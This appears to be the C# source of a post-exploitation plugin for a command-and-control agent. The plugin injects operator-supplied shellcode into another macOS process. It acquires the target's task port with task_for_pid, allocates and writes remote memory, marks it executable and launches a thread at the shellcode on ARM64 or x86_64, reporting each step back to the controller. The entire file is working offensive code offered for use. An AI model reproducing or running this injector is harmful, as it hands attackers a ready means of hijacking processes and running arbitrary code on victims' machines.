using Workflow.Contracts;
using Workflow.Models;
using System.Runtime.InteropServices;
using System.Text.Json;
using Workflow.Utilities;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "inject-shellcode";
        private IDataBroker messageManager { get; set; }

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");

            if (!RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
            {
                messageManager.Write(
                    "inject-shellcode-macos is only available on macOS",
                    job.task.id, true, "error");
                return;
            }

            InjectArgs args = JsonSerializer.Deserialize<InjectArgs>(
                job.task.parameters) ?? new InjectArgs();

            if (!args.Validate(out var message))
            {
                DebugLog.Log($"{Name} invalid args: {message} [{job.task.id}]");
                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = message,
                    completed = true,
                    status = "error"
                });
                return;
            }

            byte[] buf = Misc.Base64DecodeToByteArray(args.asm);
            DebugLog.Log(
                $"{Name} shellcode size={buf.Length}, target pid={args.pid} [{job.task.id}]");

            try
            {
                InjectIntoProcess(args.pid, buf, job.task.id);
            }
            catch (Exception e)
            {
                DebugLog.Log($"{Name} error: {e.Message} [{job.task.id}]");
                messageManager.Write(e.ToString(), job.task.id, true, "error");
            }
        }

        private void InjectIntoProcess(int pid, byte[] shellcode, string taskId)
        {
            uint selfTask = MachApi.mach_task_self();

            int kr = MachApi.task_for_pid(selfTask, pid, out uint remoteTask);
            if (kr != 0)
            {
                messageManager.Write(
                    $"task_for_pid failed (kern_return={kr}). Needs root or entitlement.",
                    taskId, true, "error");
                return;
            }

            messageManager.WriteLine(
                $"[*] Got task port for PID {pid}.", taskId, false);

            ulong remoteAddr = 0;
            ulong size = (ulong)shellcode.Length;

            kr = MachApi.mach_vm_allocate(remoteTask, ref remoteAddr, size,
                MachApi.VM_FLAGS_ANYWHERE);
            if (kr != 0)
            {
                messageManager.Write(
                    $"mach_vm_allocate failed (kern_return={kr}).",
                    taskId, true, "error");
                return;
            }

            messageManager.WriteLine(
                $"[*] Allocated {size} bytes at 0x{remoteAddr:X}.", taskId, false);

            kr = MachApi.mach_vm_write(remoteTask, remoteAddr, shellcode,
                (uint)shellcode.Length);
            if (kr != 0)
            {
                messageManager.Write(
                    $"mach_vm_write failed (kern_return={kr}).",
                    taskId, true, "error");
                return;
            }

            kr = MachApi.mach_vm_protect(remoteTask, remoteAddr, size, 0,
                MachApi.VM_PROT_READ_EXECUTE);
            if (kr != 0)
            {
                messageManager.Write(
                    $"mach_vm_protect failed (kern_return={kr}).",
                    taskId, true, "error");
                return;
            }

            bool isArm = RuntimeInformation.ProcessArchitecture ==
                Architecture.Arm64;

            int flavor = isArm
                ? MachApi.ARM_THREAD_STATE64
                : MachApi.x86_THREAD_STATE64;
            uint stateCount = isArm
                ? MachApi.ARM_THREAD_STATE64_COUNT
                : MachApi.x86_THREAD_STATE64_COUNT;

            ulong[] state = new ulong[stateCount];
            if (isArm)
            {
                state[32] = remoteAddr; // pc
            }
            else
            {
                state[16] = remoteAddr; // rip
            }

            kr = MachApi.thread_create_running(remoteTask, flavor, state,
                stateCount, out _);
            if (kr != 0)
            {
                messageManager.Write(
                    $"thread_create_running failed (kern_return={kr}).",
                    taskId, true, "error");
                return;
            }

            messageManager.Write(
                $"[*] Successfully injected {shellcode.Length} bytes into PID {pid} and started thread.",
                taskId, true);
            DebugLog.Log($"{Name} completed [{taskId}]");
        }
    }
}
